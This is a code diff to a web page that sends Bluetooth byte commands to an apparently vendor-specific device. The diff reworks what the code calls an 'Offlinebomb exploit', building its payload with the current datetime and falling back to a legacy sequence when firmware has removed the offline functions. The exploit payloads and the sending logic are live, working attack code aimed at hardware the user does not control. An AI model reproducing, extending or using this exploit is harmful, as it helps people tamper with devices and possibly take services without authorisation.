@@ -86,23 +86,6 @@
       0x01, 0x01, 0x00, 0x00
     ]);
 
-    // Offlinebomb exploit
-    // prettier-ignore
-    const startEpilogueOfflinebomb = new Uint8Array([
-      0xFE, 0xFE, 0x09, 0xBB,
-      0x00, 0x00, 0x00, 0x00,
-      0x00, 0x00, 0x00, 0x20,
-      0x01, 0x01, 0x00, 0x00,
-      0x00, 0x00, 0x20, 0x00
-    ]);
-
-    // send this before startEpilogueOfflinebomb and before endEpilogue
-    // prettier-ignore
-    const offlinebombFix = new Uint8Array([
-      0xFE, 0xFE, 0x09, 0xBC,
-      0x00, 0x00
-    ]);
-
     // prettier-ignore
     const endPrologue = new Uint8Array([
       0xFE, 0xFE, 0x09, 0xB3,
@@ -112,6 +95,13 @@
     // prettier-ignore
     const endEpilogue = new Uint8Array([
       0xFE, 0xFE, 0x09, 0xB4,
+      0x00, 0x00
+    ]);
+
+    // send this before startEpilogueOfflinebomb and before endEpilogue
+    // prettier-ignore
+    const offlinebombFix = new Uint8Array([
+      0xFE, 0xFE, 0x09, 0xBC,
       0x00, 0x00
     ]);
 
@@ -129,15 +119,43 @@
       return crc;
     }
 
+    function makeDatetimeArray() {
+      // explanation: 2013/1/11 12:34:56 => [0x13, 0x01, 0x11, 0x12, 0x34, 0x56]
+      const now = new Date().toLocaleString("zh-CN", { timeZone: "Asia/Shanghai" });
+      const date = now
+        .split(" ")[0]
+        .split("/")
+        .map((x) => parseInt(x));
+      const time = now
+        .split(" ")[1]
+        .split(":")
+        .map((x) => parseInt(x));
+      const datetimeArrayDecimal = [date[0] % 100, ...date.slice(1), ...time];
+      const decAsHex = (n) => parseInt(n.toString(), 16);
+      return datetimeArrayDecimal.map(decAsHex);
+    }
+
+    // Offlinebomb exploit
+    function makeStartEpilogueOfflinebomb() {
+      const dt = makeDatetimeArray();
+      // prettier-ignore
+      return new Uint8Array([
+        0xFE, 0xFE, 0x09, 0xBB,
+        0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, ...dt, // 6 bytes of datetime
+        0x00, 0x20, 0x00
+      ]);
+    }
+
     function makeStartEpilogueLegacy(deviceName) {
       const checksum = crc16changgong(deviceName.slice(-5));
+      const dt = makeDatetimeArray();
       // prettier-ignore
       return new Uint8Array([
         0xFE, 0xFE, 0x09, 0xB2,
         0x01, checksum & 0xFF, checksum >> 8, 0x00,
-        0x70, 0xE2, 0xEB, 0x20,
-        0x01, 0x01, 0x00, 0x00,
-        0x00, 0x6C, 0x30, 0x00
+        0x70, 0xE2, 0xEB, ...dt, // 6 bytes of datetime
+        0x6C, 0x30, 0x00
       ]);
     }
 
@@ -251,7 +269,7 @@
       }
 
       document.getElementById("dialog").showModal();
-      
+
       if (isFatalError) disconnect();
     }
 
@@ -271,7 +289,7 @@
           case 0xB1:
             await txdCharacteristic.writeValue(offlinebombFix);
             await new Promise((_) => setTimeout(_, 150));
-            await txdCharacteristic.writeValue(startEpilogueOfflinebomb);
+            await txdCharacteristic.writeValue(makeStartEpilogueOfflinebomb());
             // if we don't get a reply, it means that the firmware has stripped BB/BC offline functionality
             // we'll try the legacy start epilogue
             pendingStartEpilogueLegacy = setTimeout(() => {
